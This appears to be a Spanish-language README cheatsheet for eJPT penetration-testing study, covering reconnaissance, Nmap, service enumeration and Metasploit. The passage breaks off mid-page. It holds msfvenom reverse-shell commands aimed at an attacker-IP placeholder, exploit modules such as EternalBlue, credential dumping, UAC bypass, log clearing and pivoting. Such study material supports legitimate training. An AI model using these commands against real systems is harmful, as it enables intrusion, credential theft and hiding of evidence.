<div align="center">

# 🛡️ eJPT Cheatsheet

### Guía práctica para la preparación del certificado Junior Penestration Tester

<p align="center">
  <img src="assets/images/ejpt-cheatsheet-cover.png" alt="Portada eJPT Cheatsheet" width="850">
</p>

<p align="center">
  <img src="assets/images/ejpt-certification.png" alt="Certificación eJPT de Saúl Ruiz Plaza" width="850">
</p>

![Markdown](https://img.shields.io/badge/Markdown-000000?style=for-the-badge&logo=markdown&logoColor=white)
![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
![Networking](https://img.shields.io/badge/Networking-0A66C2?style=for-the-badge)
![Pentesting](https://img.shields.io/badge/Pentesting-6f42c1?style=for-the-badge&logo=hackthebox&logoColor=white)
![eJPT](https://img.shields.io/badge/eJPT-Study_Notes-blueviolet?style=for-the-badge)

</div>

---

## 📌 Objetivo del repositorio

Este repositorio contiene una **cheatsheet propia para preparación de eJPT y laboratorios controlados**. Está pensada para consultar rápido durante una práctica, pero sin quedarse únicamente en comandos sueltos: cada bloque explica **para qué sirve**, **cuándo utilizarlo** y **qué deberías mirar en la salida**.

> [!IMPORTANT]
> Todo el contenido está orientado a aprendizaje, CTFs, máquinas vulnerables y entornos donde exista autorización explícita. No uses estas técnicas contra sistemas de terceros sin permiso.

## 📚 Recursos del repositorio

- [Cheatsheet principal](README.md): guía rápida de comandos, metodología y técnicas para laboratorios de eJPT.
- [Plantilla de documentación](TEMPLATE.md): estructura profesional para documentar máquinas, CTFs y laboratorios de estudio.
- [Plantilla para examen eJPT](EXAM_TEMPLATE.md): estructura para organizar hosts, evidencias, credenciales, pivoting y respuestas durante simulacros o laboratorios tipo examen.

## 🧭 Índice

- [Metodología de trabajo](#-metodología-de-trabajo)
- [Reconocimiento pasivo](#-reconocimiento-pasivo)
- [Google Dorking](#-google-dorking)
- [Descubrimiento y escaneo con Nmap](#-descubrimiento-y-escaneo-con-nmap)
- [Enumeración por servicio](#-enumeración-por-servicio)
- [Metasploit](#-metasploit)
- [Explotación web y servicios comunes](#-explotación-web-y-servicios-comunes)
- [Post-explotación Windows](#-post-explotación-windows)
- [Post-explotación Linux](#-post-explotación-linux)
- [Pivoting y movimiento en red](#-pivoting-y-movimiento-en-red)
- [Utilidades prácticas](#-utilidades-prácticas)
- [Plantilla de documentación](#-plantilla-de-documentación)

---

## 🧠 Metodología de trabajo

Una buena práctica de pentesting no consiste en lanzar herramientas al azar. El flujo recomendado es:

| Fase | Qué haces | Qué buscas |
|---|---|---|
| Reconocimiento | Reunir información pública o inicial | Dominios, IPs, tecnologías, subdominios |
| Descubrimiento | Identificar hosts activos | Máquinas vivas dentro del rango |
| Enumeración | Analizar puertos y servicios | Versiones, usuarios, rutas, recursos compartidos |
| Validación | Relacionar hallazgos con vectores reales | Credenciales débiles, CVEs, malas configuraciones |
| Explotación | Obtener acceso controlado | Shell, sesión, acceso web, credenciales |
| Post-explotación | Entender el sistema comprometido | Usuarios, permisos, red interna, secretos |
| Escalada | Buscar rutas de mayor privilegio | Sudo, SUID, servicios, tokens, credenciales |
| Documentación | Registrar evidencias | Comandos, capturas, resultados y conclusiones |

> [!TIP]
> En eJPT suele ser más importante enumerar bien que memorizar exploits. Muchas veces el camino aparece al cruzar servicios, versiones y credenciales reutilizadas.



# 🔎 Reconocimiento pasivo

El reconocimiento pasivo intenta obtener información sin interactuar agresivamente con el objetivo. Sirve para crear una primera imagen de la superficie expuesta.

## Comandos base

| Herramienta | Comando | Uso práctico |
|---|---|---|
| `whatis` | `whatis nmap` | Recordar rápidamente qué hace una herramienta de Linux. |
| `host` | `host dominio.com` | Resolver un dominio y ver direcciones asociadas. |
| `whois` | `whois dominio.com` | Consultar información pública del registro del dominio. |
| `whatweb` | `whatweb http://objetivo` | Identificar tecnologías web, servidor, CMS o cabeceras. |
| `dnsrecon` | `dnsrecon -d dominio.com` | Enumerar registros DNS, nameservers y posibles datos útiles. |
| `wafw00f` | `wafw00f https://objetivo` | Detectar si una web está detrás de un WAF. |
| `sublist3r` | `sublist3r -d dominio.com` | Buscar subdominios usando fuentes públicas. |

## Cómo interpretar resultados

- Si `whatweb` detecta un CMS, anota tecnología y versión. Puede orientar la enumeración posterior.
- Si `dnsrecon` muestra subdominios o registros interesantes, pruébalos individualmente.
- Si `wafw00f` detecta un WAF, evita escaneos ruidosos y documenta que puede haber filtrado de peticiones.
- Si aparecen varios dominios o subdominios, crea una lista para usarlos después con herramientas como `httpx`, `ffuf`, `gobuster` o `nmap`.

<details>
<summary><strong>📸 Capturas de reconocimiento pasivo</strong></summary>

<p align="center">
  <img src="assets/images/reconocimiento-pasivo-step-01.png" alt="Captura 1" width="850">
</p>

<p align="center">
  <img src="assets/images/reconocimiento-pasivo-step-02.png" alt="Captura 2" width="850">
</p>

<p align="center">
  <img src="assets/images/reconocimiento-pasivo-step-03.png" alt="Captura 3" width="850">
</p>

<p align="center">
  <img src="assets/images/reconocimiento-pasivo-step-04.png" alt="Captura 4" width="850">
</p>

<p align="center">
  <img src="assets/images/reconocimiento-pasivo-step-05.png" alt="Captura 5" width="850">
</p>

<p align="center">
  <img src="assets/images/reconocimiento-pasivo-step-06.png" alt="Captura 6" width="850">
</p>

<p align="center">
  <img src="assets/images/reconocimiento-pasivo-step-07.png" alt="Captura 7" width="850">
</p>

<p align="center">
  <img src="assets/images/reconocimiento-pasivo-step-08.png" alt="Captura 8" width="850">
</p>

<p align="center">
  <img src="assets/images/reconocimiento-pasivo-step-09.png" alt="Captura 9" width="850">
</p>

</details>




# 🌐 Google Dorking

Google Dorking permite encontrar información indexada sin tocar directamente la infraestructura. Es útil para descubrir paneles, documentos, backups o rutas interesantes.

| Operador | Ejemplo | Qué aporta |
|---|---|---|
| `site:` | `site:dominio.com` | Limita los resultados a un dominio. |
| `site:*.` | `site:*.dominio.com` | Busca subdominios indexados. |
| `inurl:` | `site:dominio.com inurl:admin` | Localiza palabras dentro de URLs. |
| `intitle:` | `intitle:"index of"` | Busca palabras en títulos de páginas. |
| `filetype:` | `site:dominio.com filetype:pdf` | Encuentra documentos concretos. |
| `cache:` | `cache:dominio.com` | Revisa versiones cacheadas cuando estén disponibles. |
| comillas | `"admin login"` | Fuerza coincidencias exactas. |
| exclusión | `site:dominio.com -www` | Elimina términos de los resultados. |

## Dorks útiles en laboratorios

```text
site:dominio.com filetype:pdf
site:dominio.com inurl:login
site:dominio.com intitle:admin
site:*.dominio.com
intitle:"index of" "backup"
inurl:config filetype:txt
```

> [!NOTE]
> El valor del dorking no está en copiar dorks, sino en observar patrones: nombres de empleados, tecnologías, rutas antiguas, ficheros olvidados o subdominios no evidentes.



# 📡 Descubrimiento y escaneo con Nmap

Nmap es una de las herramientas centrales en eJPT. Permite descubrir hosts, identificar puertos, detectar servicios, lanzar scripts NSE y guardar resultados para analizarlos después.

## Descubrimiento de hosts

| Objetivo | Comando | Explicación |
|---|---|---|
| Ping scan básico | `nmap -sn 192.168.1.0/24` | Detecta hosts activos sin escanear puertos. |
| Saltar ping | `nmap -Pn 10.10.10.5` | Trata el host como activo aunque no responda a ping. |
| ARP discovery | `netdiscover -r 192.168.1.0/24` | Muy útil en red local para descubrir equipos por ARP. |
| TCP SYN ping | `nmap -sn -PS22,80,443 10.10.10.0/24` | Comprueba hosts mediante SYN a puertos comunes. |
| UDP ping | `nmap -sn -PU137,161 10.10.10.0/24` | Útil si ICMP está filtrado y hay UDP expuesto. |
| Lista de objetivos | `nmap -sn -iL targets.txt` | Escanea objetivos cargados desde un fichero. |

## Escaneo de puertos

| Necesidad | Comando recomendado | Cuándo usarlo |
|---|---|---|
| Escaneo inicial | `nmap -sS -T4 10.10.10.5` | Primera revisión TCP rápida. |
| Versiones y scripts comunes | `nmap -sC -sV -T4 10.10.10.5` | Obtener servicios, versiones y checks habituales. |
| Todos los puertos TCP | `nmap -p- --min-rate 5000 -T4 10.10.10.5` | Buscar servicios fuera de puertos típicos. |
| Puertos concretos | `nmap -p 22,80,445 10.10.10.5` | Profundizar en servicios ya detectados. |
| UDP | `nmap -sU --top-ports 100 10.10.10.5` | Revisar servicios UDP frecuentes. |
| Detección de SO | `nmap -O 10.10.10.5` | Inferir sistema operativo por fingerprinting. |
| Agresivo | `nmap -A 10.10.10.5` | Combina versión, SO, scripts y traceroute. Puede ser ruidoso. |

## Salidas y evidencias

| Formato | Comando | Para qué sirve |
|---|---|---|
| Normal | `nmap -oN scan.txt 10.10.10.5` | Guardar salida legible. |
| XML | `nmap -oX scan.xml 10.10.10.5` | Importar en herramientas como Metasploit. |
| Grepable | `nmap -oG scan.gnmap 10.10.10.5` | Filtrar rápido con `grep`, `awk` o scripts. |
| Todos | `nmap -oA fullscan 10.10.10.5` | Genera `.nmap`, `.xml` y `.gnmap`. |

## Opciones que conviene entender

| Opción | Significado | Nota práctica |
|---|---|---|
| `-sS` | SYN scan | Rápido y común para TCP. |
| `-sT` | TCP connect | Útil sin privilegios root. |
| `-sV` | Version detection | Fundamental para buscar vulnerabilidades. |
| `-sC` | Scripts por defecto | Buen equilibrio entre rapidez e información. |
| `-O` | OS detection | Puede fallar si hay filtrado o pocos puertos abiertos. |
| `-T4` | Timing agresivo moderado | Adecuado en laboratorio. |
| `--reason` | Explica por qué Nmap marca un puerto así | Muy útil para entender filtrados. |
| `--host-timeout` | Límite de tiempo por host | Evita quedarse bloqueado en objetivos lentos. |
| `--scan-delay` | Retraso entre paquetes | Reduce ruido, pero hace el escaneo más lento. |
| `-D` | Decoys | Técnica avanzada y ruidosa; usar solo en laboratorio. |
| `-g` | Puerto origen | Puede ayudar a probar filtrados mal configurados. |

## NSE: Nmap Scripting Engine

```bash
nmap --script=default -sV 10.10.10.5
nmap --script=vuln -sV 10.10.10.5
nmap --script=smb-enum-shares -p445 10.10.10.5
nmap --script=http-title,http-headers -p80,8080 10.10.10.5
```

Los scripts NSE automatizan comprobaciones. En eJPT son especialmente útiles para SMB, HTTP, FTP, SNMP y servicios con banners claros.

<details>
<summary><strong>📸 Capturas de descubrimiento, escaneo y Nmap</strong></summary>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-01.png" alt="Captura 10" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-02.png" alt="Captura 11" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-03.png" alt="Captura 12" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-04.png" alt="Captura 13" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-05.png" alt="Captura 14" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-06.png" alt="Captura 15" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-07.png" alt="Captura 16" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-08.png" alt="Captura 17" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-09.png" alt="Captura 18" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-10.png" alt="Captura 19" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-11.png" alt="Captura 20" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-12.png" alt="Captura 21" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-13.png" alt="Captura 22" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-14.png" alt="Captura 23" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-15.png" alt="Captura 24" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-16.png" alt="Captura 25" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-17.png" alt="Captura 26" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-18.png" alt="Captura 27" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-19.png" alt="Captura 28" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-20.png" alt="Captura 29" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-21.png" alt="Captura 30" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-22.png" alt="Captura 31" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-23.png" alt="Captura 32" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-24.png" alt="Captura 33" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-25.png" alt="Captura 34" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-26.png" alt="Captura 35" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-27.png" alt="Captura 36" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-28.png" alt="Captura 37" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-29.png" alt="Captura 38" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-30.png" alt="Captura 39" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-31.png" alt="Captura 40" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-32.png" alt="Captura 41" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-33.png" alt="Captura 42" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-34.png" alt="Captura 43" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-35.png" alt="Captura 44" width="850">
</p>

<p align="center">
  <img src="assets/images/descubrimiento-y-escaneo-con-nmap-step-36.png" alt="Captura 45" width="850">
</p>

</details>


# 🧩 Enumeración por servicio

Después del escaneo, cada puerto abierto se trata como una pista. La enumeración debe adaptarse al servicio.

## HTTP / HTTPS

| Acción | Comando | Qué mirar |
|---|---|---|
| Cabeceras | `curl -I http://IP` | Servidor, tecnologías, redirects, cookies. |
| Título web | `nmap --script=http-title -p80 IP` | Identificar aplicación o panel. |
| Directorios | `gobuster dir -u http://IP -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt` | Rutas ocultas, paneles, backups. |
| Nikto | `nikto -h http://IP` | Misconfiguraciones y hallazgos conocidos. |
| WordPress | `wpscan --url http://IP --enumerate u,p,t` | Usuarios, plugins y temas. |

## SMB

```bash
smbclient -L //IP/ -N
smbclient //IP/recurso -N
smbmap -H IP
smbmap -H IP -u usuario -p contraseña
nmap --script=smb-enum-shares,smb-enum-users -p445 IP
```

Busca recursos anónimos, permisos de lectura/escritura, nombres de usuarios, ficheros de configuración y credenciales reutilizables.

## FTP

```bash
ftp IP
nmap --script=ftp-anon,ftp-syst -p21 IP
```

Comprueba si existe acceso anónimo, permisos de subida, banners y ficheros expuestos.

## SSH

```bash
ssh usuario@IP
nmap -sV -p22 IP
```

SSH suele ser vía de acceso más que vector inicial. Tiene valor si encuentras credenciales, claves privadas o reutilización de contraseñas.

## SMTP

```bash
nmap --script=smtp-commands,smtp-enum-users -p25 IP
nc -nv IP 25
```

Puede permitir enumeración de usuarios si el servidor responde a comandos como `VRFY` o `EXPN`.

## SNMP

```bash
snmpwalk -v2c -c public IP
nmap --script=snmp-info -sU -p161 IP
```

SNMP mal configurado puede revelar usuarios, procesos, interfaces de red, rutas y software instalado.

## NetBIOS

```bash
nbtscan IP
nmap --script=nbstat -sU -p137 IP
```

Puede dar nombres de máquina, grupos de trabajo y datos útiles para entender un entorno Windows.

<details>
<summary><strong>📸 Capturas de enumeración por servicio</strong></summary>

<p align="center">
  <img src="assets/images/enumeracion-por-servicio-step-01.png" alt="Captura 46" width="850">
</p>

<p align="center">
  <img src="assets/images/enumeracion-por-servicio-step-02.png" alt="Captura 47" width="850">
</p>

<p align="center">
  <img src="assets/images/enumeracion-por-servicio-step-03.png" alt="Captura 48" width="850">
</p>

<p align="center">
  <img src="assets/images/enumeracion-por-servicio-step-04.png" alt="Captura 49" width="850">
</p>

<p align="center">
  <img src="assets/images/enumeracion-por-servicio-step-05.png" alt="Captura 50" width="850">
</p>

<p align="center">
  <img src="assets/images/enumeracion-por-servicio-step-06.png" alt="Captura 51" width="850">
</p>

<p align="center">
  <img src="assets/images/enumeracion-por-servicio-step-07.png" alt="Captura 52" width="850">
</p>

<p align="center">
  <img src="assets/images/enumeracion-por-servicio-step-08.png" alt="Captura 53" width="850">
</p>

<p align="center">
  <img src="assets/images/enumeracion-por-servicio-step-09.png" alt="Captura 54" width="850">
</p>

<p align="center">
  <img src="assets/images/enumeracion-por-servicio-step-10.png" alt="Captura 55" width="850">
</p>

<p align="center">
  <img src="assets/images/enumeracion-por-servicio-step-11.png" alt="Captura 56" width="850">
</p>

<p align="center">
  <img src="assets/images/enumeracion-por-servicio-step-12.png" alt="Captura 57" width="850">
</p>

<p align="center">
  <img src="assets/images/enumeracion-por-servicio-step-13.png" alt="Captura 58" width="850">
</p>

<p align="center">
  <img src="assets/images/enumeracion-por-servicio-step-14.png" alt="Captura 59" width="850">
</p>

<p align="center">
  <img src="assets/images/enumeracion-por-servicio-step-15.png" alt="Captura 60" width="850">
</p>

</details>




# 🚀 Metasploit

Metasploit ayuda a buscar módulos, configurar opciones, validar servicios, ejecutar exploits y realizar post-explotación en laboratorios autorizados.

## Flujo básico de trabajo en Metasploit

```bash
msfconsole
search nombre_servicio
use modulo
info
show options
show payloads
set RHOSTS IP
set RPORT PUERTO
set PAYLOAD payload
set LHOST IP_ATACANTE
set LPORT PUERTO
check
run
```

| Paso | Uso |
|---|---|
| `msfconsole` | Iniciar Metasploit Framework. |
| `search nombre_servicio` | Buscar módulos por servicio, CVE, tecnología o palabra clave. |
| `use modulo` | Seleccionar el módulo que se va a usar. |
| `info` | Revisar descripción, referencias, targets y requisitos. |
| `show options` | Ver parámetros obligatorios y valores configurados. |
| `show payloads` | Listar payloads compatibles con el módulo. |
| `set RHOSTS IP` | Definir el objetivo. |
| `set RPORT PUERTO` | Definir el puerto del servicio. |
| `set PAYLOAD payload` | Elegir payload compatible con sistema y arquitectura. |
| `set LHOST IP_ATACANTE` | Definir la IP de escucha del atacante, normalmente la IP de VPN. |
| `set LPORT PUERTO` | Definir el puerto de escucha. |
| `check` | Comprobar si el objetivo parece vulnerable, si el módulo lo permite. |
| `run` | Ejecutar el módulo configurado. |

Antes de ejecutar un módulo conviene confirmar versión, sistema operativo, puerto y contexto con Nmap u otra enumeración previa.

## Base de datos y workspaces

```bash
service postgresql start
msfconsole
db_status
workspace
workspace -a nombre
db_import scan.xml
db_nmap -sC -sV IP
hosts
services
vulns
```

La base de datos permite organizar hosts, servicios, vulnerabilidades y resultados de escaneo dentro de Metasploit. Los workspaces ayudan a separar laboratorios o máquinas para no mezclar evidencias.

## Módulos auxiliares de escaneo

Los módulos auxiliares no siempre explotan. Muchas veces sirven para enumerar, validar credenciales, descubrir información o confirmar superficie de ataque.

| Servicio | Módulo | Uso |
|---|---|---|
| TCP | `auxiliary/scanner/portscan/tcp` | Escaneo TCP desde Metasploit. |
| UDP | `auxiliary/scanner/discovery/udp_sweep` | Descubrimiento UDP. |
| FTP | `auxiliary/scanner/ftp/ftp_version` | Enumerar versión FTP. |
| FTP | `auxiliary/scanner/ftp/anonymous` | Comprobar acceso anónimo. |
| FTP | `auxiliary/scanner/ftp/ftp_login` | Probar credenciales FTP. |
| SMB | `auxiliary/scanner/smb/smb_version` | Enumerar versión SMB. |
| SMB | `auxiliary/scanner/smb/smb_enumusers` | Enumerar usuarios SMB. |
| SMB | `auxiliary/scanner/smb/smb_enumshares` | Enumerar recursos compartidos. |
| SMB | `auxiliary/scanner/smb/smb_login` | Probar credenciales SMB. |
| HTTP | `auxiliary/scanner/http/http_version` | Detectar versión HTTP. |
| HTTP | `auxiliary/scanner/http/http_header` | Obtener cabeceras HTTP. |
| HTTP | `auxiliary/scanner/http/robots_txt` | Buscar `robots.txt`. |
| HTTP | `auxiliary/scanner/http/dir_scanner` | Enumerar directorios. |
| HTTP | `auxiliary/scanner/http/files_dir` | Enumerar ficheros. |
| HTTP | `auxiliary/scanner/http/http_login` | Probar autenticación HTTP. |
| MySQL | `auxiliary/scanner/mysql/mysql_version` | Enumerar versión MySQL. |
| MySQL | `auxiliary/scanner/mysql/mysql_login` | Probar credenciales MySQL. |
| MySQL | `auxiliary/admin/mysql/mysql_enum` | Enumerar información MySQL. |
| MySQL | `auxiliary/admin/mysql/mysql_sql` | Ejecutar consultas SQL. |
| MySQL | `auxiliary/scanner/mysql/mysql_schemadump` | Extraer esquema de base de datos. |
| SSH | `auxiliary/scanner/ssh/ssh_version` | Enumerar versión SSH. |
| SSH | `auxiliary/scanner/ssh/ssh_login` | Probar credenciales SSH. |
| SSH | `auxiliary/scanner/ssh/ssh_enumusers` | Enumerar usuarios SSH. |
| SMTP | `auxiliary/scanner/smtp/smtp_version` | Enumerar versión SMTP. |
| SMTP | `auxiliary/scanner/smtp/smtp_enum` | Enumerar usuarios SMTP. |
| RDP | `auxiliary/scanner/rdp/rdp_scanner` | Comprobar RDP. |
| WinRM | `auxiliary/scanner/winrm/winrm_login` | Probar acceso WinRM. |

## Búsqueda de módulos

```bash
search type:auxiliary name:ftp
search type:auxiliary name:smb
search type:exploit platform:windows smb
search cve:2019-0708
search samba
search tomcat
```

Antes de usar un módulo, revisa `info`, `show options`, versión del servicio, sistema objetivo y target disponible. Un módulo puede existir pero no aplicar a la versión exacta del laboratorio.

## Payloads y multi/handler

| Tipo | Uso |
|---|---|
| Reverse | La máquina objetivo conecta hacia el atacante. Suele ser útil con NAT o VPN. |
| Bind | El objetivo abre un puerto y el atacante se conecta a él. |
| Meterpreter | Payload avanzado con funciones de post-explotación, sesiones y gestión de archivos. |

Listener básico:

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST TU_IP
set LPORT 4444
run
```

El payload del handler debe coincidir con el payload generado o ejecutado en la máquina del laboratorio.

## MSFvenom

```bash
msfvenom --list payloads
msfvenom --list formats
msfvenom --list encoders
```

Ejemplos habituales:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=TU_IP LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=TU_IP LPORT=4444 -f exe -o shell-x64.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=TU_IP LPORT=4444 -f elf -o shell.elf
msfvenom -p php/meterpreter/reverse_tcp LHOST=TU_IP LPORT=4444 -f raw -o shell.php
```

| Opción | Uso |
|---|---|
| `-p` | Payload a generar. |
| `LHOST` | IP del atacante. |
| `LPORT` | Puerto de escucha. |
| `-f` | Formato de salida. |
| `-o` | Archivo de salida. |
| `-a` | Arquitectura. |
| `-e` | Encoder. |
| `-i` | Iteraciones del encoder. |
| `-x` | Ejecutable plantilla para inyección. |
| `-k` | Intentar mantener funcionalidad del ejecutable original. |

Los encoders no garantizan evasión. Úsalos solo en entornos de laboratorio, CTFs o sistemas donde tengas autorización explícita.

## Resource scripts

```bash
msfconsole -r script.rc
resource /ruta/script.rc
makerc acciones.rc
```

Ejemplo de `.rc`:

```text
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST TU_IP
set LPORT 4444
run
```

Los resource scripts automatizan comandos repetitivos de Metasploit. Son útiles para preparar listeners, importar escaneos o cargar configuraciones repetidas.

## Meterpreter básico

| Comando | Uso |
|---|---|
| `sysinfo` | Información del sistema. |
| `getuid` | Usuario actual. |
| `getprivs` | Privilegios del usuario. |
| `pwd` | Directorio actual. |
| `ls` | Listar archivos. |
| `cd` | Cambiar directorio. |
| `download` | Descargar archivo. |
| `upload` | Subir archivo. |
| `shell` | Abrir shell del sistema. |
| `background` | Enviar sesión al fondo. |
| `sessions` | Ver sesiones. |
| `sessions -i ID` | Interactuar con sesión. |
| `hashdump` | Extraer hashes si hay permisos. |
| `ps` | Listar procesos. |
| `migrate PID` | Migrar a otro proceso. |
| `clearev` | Borrar logs en laboratorio. |

Las acciones de post-explotación deben limitarse a laboratorios autorizados y evidencias necesarias para el objetivo del ejercicio.

## Convertir shell a Meterpreter

```bash
use post/multi/manage/shell_to_meterpreter
set SESSION ID
set LHOST TU_IP
run
```

También se puede intentar actualizar una sesión con:

```bash
sessions -u ID
```

Esto sirve cuando primero se obtiene una shell simple y se quiere mejorar la interacción con Meterpreter.

## Módulos de explotación comunes en laboratorios

| Técnica / Servicio | Módulo | Uso |
|---|---|---|
| WebDAV IIS | `exploit/windows/iis/iis_webdav_upload_asp` | Subida de payload ASP en WebDAV vulnerable. |
| ShellShock | `exploit/multi/http/apache_mod_cgi_bash_env_exec` | Explotación de CGI vulnerable a ShellShock. |
| Tomcat | `exploit/multi/http/tomcat_jsp_upload_bypass` | Subida de JSP en Tomcat vulnerable. |
| Samba | `exploit/linux/samba/is_known_pipename` | Explotación de Samba vulnerable en Linux. |
| MS17-010 | `exploit/windows/smb/ms17_010_eternalblue` | Explotación de SMBv1 vulnerable. |
| BlueKeep | `exploit/windows/rdp/cve_2019_0708_bluekeep_rce` | Explotación RDP vulnerable en laboratorio. |
| WinRM | `exploit/windows/winrm/winrm_script_exec` | Ejecución mediante WinRM con credenciales. |
| PsExec | `exploit/windows/smb/psexec` | Acceso remoto SMB con credenciales o hash. |

Usa estos módulos únicamente si la versión, el sistema, la arquitectura y el contexto del laboratorio coinciden.

## Post-explotación Windows con Metasploit

| Módulo / Comando | Utilidad |
|---|---|
| `post/windows/gather/win_privs` | Revisar privilegios del usuario. |
| `post/windows/gather/enum_logged_on_users` | Enumerar usuarios con sesión iniciada. |
| `post/windows/gather/checkvm` | Detectar si el sistema está virtualizado. |
| `post/windows/gather/enum_applications` | Listar aplicaciones instaladas. |
| `post/windows/gather/enum_av_excluded` | Revisar exclusiones de antivirus. |
| `post/windows/gather/enum_computers` | Enumerar equipos visibles. |
| `post/windows/gather/enum_patches` | Revisar parches instalados. |
| `post/windows/gather/enum_shares` | Enumerar recursos compartidos. |
| `post/windows/manage/enable_rdp` | Habilitar RDP en laboratorio, si procede. |
| `post/windows/manage/archmigrate` | Migrar a proceso de arquitectura compatible. |
| `post/multi/recon/local_exploit_suggester` | Sugerir posibles escaladas locales. |
| `load kiwi` | Cargar extensión Kiwi en Meterpreter. |
| `creds_all` | Mostrar credenciales disponibles en Kiwi. |
| `lsa_dump_sam` | Extraer SAM si hay permisos. |
| `lsa_dump_secrets` | Extraer secretos LSA si hay permisos. |

El dumping de credenciales solo debe hacerse en laboratorios autorizados, con un objetivo claro y documentando la evidencia necesaria.

## Bypass UAC e impersonación de tokens

```bash
getprivs
load incognito
list_tokens -u
impersonate_token "TOKEN"
```

Módulo habitual en laboratorio:

```bash
exploit/windows/local/bypassuac_injection
```

Estas técnicas dependen de privilegios, arquitectura, sesión disponible y contexto del sistema.

## Post-explotación Linux con Metasploit

| Módulo | Utilidad |
|---|---|
| `post/linux/gather/hashdump` | Intentar extraer hashes si hay permisos. |
| `post/multi/gather/env` | Recopilar variables de entorno. |
| `post/multi/gather/enum_network` | Enumerar configuración de red. |
| `post/multi/gather/enum_protection` | Revisar mecanismos de protección. |
| `post/multi/gather/enum_system` | Enumerar información del sistema. |
| `post/multi/gather/checkvm` | Detectar virtualización. |
| `post/multi/gather/enum_users_history` | Revisar historial de usuarios. |
| `exploit/unix/local/chkrootkit` | Escalada local si el sistema es vulnerable. |

## Pivoting con Metasploit

```bash
ipconfig
route print
run autoroute -s RED_INTERNA/CIDR
background
use auxiliary/server/socks_proxy
set SRVPORT 9050
run
```

Port forwarding:

```bash
portfwd add -l PUERTO_LOCAL -p PUERTO_REMOTO -r IP_INTERNA
```

| Técnica | Uso |
|---|---|
| `autoroute` | Añade una ruta hacia una red interna usando una sesión comprometida. |
| `socks_proxy` | Permite usar herramientas externas con `proxychains`. |
| `portfwd` | Permite acceder a un puerto interno desde `localhost`. |


## Errores comunes

| Problema | Causa probable | Solución |
|---|---|---|
| No llega la shell | `LHOST` incorrecto | Revisar IP de interfaz. |
| Exploit falla | Versión no vulnerable | Revisar versión e `info`. |
| Payload incompatible | Arquitectura incorrecta | Usar payload x86/x64 correcto. |
| Sesión inestable | Proceso incorrecto | Migrar a proceso estable. |
| No funciona pivoting | Ruta mal añadida | Revisar `autoroute`, `proxychains` y red interna. |
| Handler no recibe conexión | Payload no coincide | Usar mismo payload en `msfvenom` y handler. |
| La shell no entra aunque parece estar todo bien | El exploit puede fallar de forma temporal o el handler puede no estar escuchando correctamente | Volver a ejecutar el exploit, reiniciar el listener y revisar conectividad entre atacante y víctima. |

<details>
<summary><strong>📸 Capturas de Metasploit y módulos</strong></summary>

<p align="center">
  <img src="assets/images/metasploit-step-01.png" alt="Captura 61" width="850">
</p>

<p align="center">
  <img src="assets/images/metasploit-step-02.png" alt="Captura 62" width="850">
</p>

<p align="center">
  <img src="assets/images/metasploit-step-03.png" alt="Captura 63" width="850">
</p>

<p align="center">
  <img src="assets/images/metasploit-step-04.png" alt="Captura 64" width="850">
</p>

<p align="center">
